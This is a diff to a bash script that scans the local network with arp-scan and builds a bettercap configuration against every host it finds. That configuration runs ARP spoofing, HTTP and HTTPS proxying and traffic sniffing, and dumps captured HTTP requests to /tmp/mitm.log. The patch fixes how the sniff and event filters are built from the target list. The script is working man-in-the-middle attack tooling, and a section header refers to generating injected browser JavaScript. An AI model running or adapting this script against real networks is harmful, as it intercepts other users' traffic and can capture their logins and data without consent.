@@ -187,6 +187,8 @@ TARGETS=$(arp-scan --interface="$IFACE" --localnet --ignoredups 2>/dev/null | \
     awk '/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+/ {print $1}' | \
     grep -v -E "^($LAN|$GATEWAY)$" | sort -u | tr '\n' ',' | sed 's/,$//')
 
+FILTERS=$(echo "$TARGETS" | tr ',' '\n' | sed 's/^/host /' | paste -sd " or " -)
+
 # ========================
 # --- GENERATE CROSS-BROWSER JS ---
 # ========================
@@ -225,17 +227,17 @@ http.proxy on
 https.proxy on
 
 # Sniff Traffic
-set net.sniff.filter "host $TARGETS"
+set net.sniff.filter "$FILTERS"
 net.sniff on
 
 # ARP Spoofing
 set arp.spoof.targets $TARGETS
 set arp.spoof.internal true
-set arp.spoof.whitelist !${TARGETS}
+set arp.spoof.whitelist !$TARGETS
 arp.spoof on
 
 # Event Logs
-set events.stream.filter "host $TARGETS"
+set events.stream.filter "$FILTERS"
 events.stream on
 set events.stream.output /tmp/mitm.log
 set events.stream.http.request.dump true
